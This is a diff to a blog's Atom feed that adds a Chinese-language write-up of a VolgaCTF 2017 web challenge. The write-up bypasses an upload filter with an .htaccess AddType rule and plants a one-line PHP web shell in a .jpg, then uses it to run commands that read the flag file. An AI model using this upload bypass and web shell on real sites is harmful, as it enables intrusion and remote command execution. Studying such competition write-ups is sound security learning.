@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://andyw330.github.io/"/>
-  <updated>2017-03-31T11:00:41.000Z</updated>
+  <updated>2017-03-31T14:47:52.000Z</updated>
   <id>https://andyw330.github.io/</id>
   
   <author>
@@ -14,6 +14,53 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>[VolgaCTF 2017 Quals] - Share Point 200</title>
+    <link href="https://andyw330.github.io/2017/03/31/VolgaCTF-2017-Quals-Share-Point-200/"/>
+    <id>https://andyw330.github.io/2017/03/31/VolgaCTF-2017-Quals-Share-Point-200/</id>
+    <published>2017-03-31T13:08:00.000Z</published>
+    <updated>2017-03-31T14:47:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="題目資訊"><a href="#題目資訊" class="headerlink" title="題目資訊"></a>題目資訊</h1><blockquote>
+<p>Category: Web<br>Point: 200<br>Description:<br>Look! I wrote a good service for sharing your files with your friends, enjoy)<br>share-point.quals.2017.volgactf.ru</p>
+<p><strong>Hints</strong></p>
+<ol>
+<li>flag’s location is <strong>opt</strong>imal</li>
+</ol>
+</blockquote>
+<a id="more"></a>
+<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>這個網站可以讓人上傳檔案到自己帳號，還可以把檔案分享給另一個帳號。我們可以決定要不要收被分享的檔案，收了就會把該檔案加進自己帳號的檔案夾內。上傳檔案的部分會把<code>.php</code>, <code>.html</code>副檔名的檔案擋掉。<br>檔案資料夾路徑：<code>http://share-point.quals.2017.volgactf.ru/files/&lt;帳號名稱&gt;/&lt;檔案名稱&gt;</code></p>
+<p>這題卡了很久，一直在找share功能是不是有能exploit的方法，試到最後只知道能把server上的檔案 (Ex: <code>../../index.php</code>) share給其他帳號。可是php檔案會被直接執行，所以也拿不到source code，也試了下拿<code>.htaccess</code>，可是讀取會得到status 403，然後就沒有然後了… QAQ</p>
+<p>賽後才找到了方法，正解是我們可以上傳<code>.htaccess</code>檔案，稍微參考了一下DigitalOcean的 <a href="https://www.digitalocean.com/community/tutorials/how-to-use-the-htaccess-file" target="_blank" rel="external">How To Use the .htaccess File</a>，還有這篇 <a href="https://www.php5.idv.tw/html.php?mod=article&amp;do=show&amp;shid=39" target="_blank" rel="external">[設定] PHP安裝之後APACHE之設定</a>，顯示我們可以用<code>AddType</code>來讓不同副檔名的檔案當作php來執行。</p>
+<p>在<code>.htaccess</code>裡寫下這行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AddType application/x-httpd-php .jpg</div></pre></td></tr></table></figure></p>
+<p>上傳到網站上，路徑會是 <code>http://share-point.quals.2017.volgactf.ru/files/&lt;帳號名稱&gt;/.htaccess</code>，這就表示在我們帳號下資料夾內的<code>jpg</code>檔案能當<code>php</code>執行了！！！</p>
+<p>再來建個<code>shell.jpg</code>，裡面放php shell code：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php echo system($_GET[&apos;cmd&apos;]); ?&gt;</div></pre></td></tr></table></figure></p>
+<p>上傳！大功告成！<br>可以先用 locate 找 flag 的位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://share-point.quals.2017.volgactf.ru/files/&lt;帳號名稱&gt;/shell.jpg?cmd=locate flag</div></pre></td></tr></table></figure></p>
+<p>找到flag的位置在 <code>/opt/flag.txt</code>，最後就是cat出來啦<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://share-point.quals.2017.volgactf.ru/files/&lt;帳號名稱&gt;/shell.jpg?cmd=cat /opt/flag.txt</div></pre></td></tr></table></figure></p>
+<p>Flag: <code>VolgaCTF{AnoTHer_apPro0Ach_to_file_Upl0Ad_with_PhP}</code></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;題目資訊&quot;&gt;&lt;a href=&quot;#題目資訊&quot; class=&quot;headerlink&quot; title=&quot;題目資訊&quot;&gt;&lt;/a&gt;題目資訊&lt;/h1&gt;&lt;blockquote&gt;
+&lt;p&gt;Category: Web&lt;br&gt;Point: 200&lt;br&gt;Description:&lt;br&gt;Look! I wrote a good service for sharing your files with your friends, enjoy)&lt;br&gt;share-point.quals.2017.volgactf.ru&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Hints&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;flag’s location is &lt;strong&gt;opt&lt;/strong&gt;imal&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/blockquote&gt;
+    
+    </summary>
+    
+      <category term="CTF Write-ups" scheme="https://andyw330.github.io/categories/CTF-Write-ups/"/>
+    
+    
+      <category term="VolgaCTF 2017 Quals" scheme="https://andyw330.github.io/tags/VolgaCTF-2017-Quals/"/>
+    
+      <category term="Web" scheme="https://andyw330.github.io/tags/Web/"/>
+    
+  </entry>
   
   <entry>
     <title>[VolgaCTF 2017 Quals] - PyCrypto 150</title>
